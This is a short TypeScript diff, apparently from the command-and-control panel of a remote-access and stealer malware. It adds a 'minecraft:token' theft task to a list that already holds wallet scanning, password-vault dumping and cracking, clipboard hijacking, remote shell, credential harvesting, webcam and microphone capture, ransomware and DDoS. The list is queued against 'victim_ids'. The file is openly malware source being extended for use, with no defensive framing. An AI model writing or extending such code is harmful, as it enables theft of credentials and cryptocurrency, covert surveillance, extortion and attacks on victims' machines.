@@ -13,7 +13,7 @@ import { compareVersion } from '../lib/agent-compat';
 import { capabilityMissing } from '../lib/agent-contract';
 import { mimeFor } from '../lib/mime';
 
-const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'webcam:snapshot', 'webcam:stream', 'webcam:devices', 'mic', 'mic:record', 'desktop:frame', 'desktop:screens', 'input:mouse', 'input:key', 'clipboard:get', 'ransomware', 'ddos'] as const;
+const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'webcam:snapshot', 'webcam:stream', 'webcam:devices', 'mic', 'mic:record', 'desktop:frame', 'desktop:screens', 'input:mouse', 'input:key', 'clipboard:get', 'minecraft:token', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
   victim_ids: z.array(z.string().uuid()).min(1).max(500),
